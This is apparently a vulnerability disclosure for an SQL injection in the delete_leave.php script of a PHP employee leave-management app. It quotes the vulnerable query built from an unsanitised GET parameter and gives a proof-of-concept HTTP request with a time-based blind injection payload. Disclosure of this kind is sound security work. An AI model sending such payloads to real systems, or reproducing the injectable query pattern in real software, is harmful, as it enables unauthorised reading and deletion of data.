### Vulnerability file address

`Employee/delete_leave.php` from line 9,The `$id` parameter is controllable and the `$id` is not protected from sql injection, line 10 `$sql = "DELETE From `tblleave` where leaveID ='$id'";` ,line 11 `$result = mysqli_query($conn, $sql);`Line 15 performs a SQL query, causing SQL injection

```php
<?php
include('../inc/topbar.php'); 
if(empty($_SESSION['login_email']))
{   
header("Location: ../Account/login.php"); 
}


$id=$_GET['id'];
$sql = "DELETE From `tblleave` where leaveID ='$id'";
$result = mysqli_query($conn, $sql);
//$row = mysqli_num_rows($result);
if ($result >0){

header("location: leave_history.php");
}
```

### POC

```http
GET /CMS/php/employee_akpoly/Employee/delete_leave.php?id=1' AND 4330=BENCHMARK(5000000,MD5(0x7367734e))-- TaKM HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://10.0.0.20:82/CMS/php/employee_akpoly/Employee/leave_history.php
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1
```

### Attack results pictures

![image-20250128215357806](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501282153854.png)
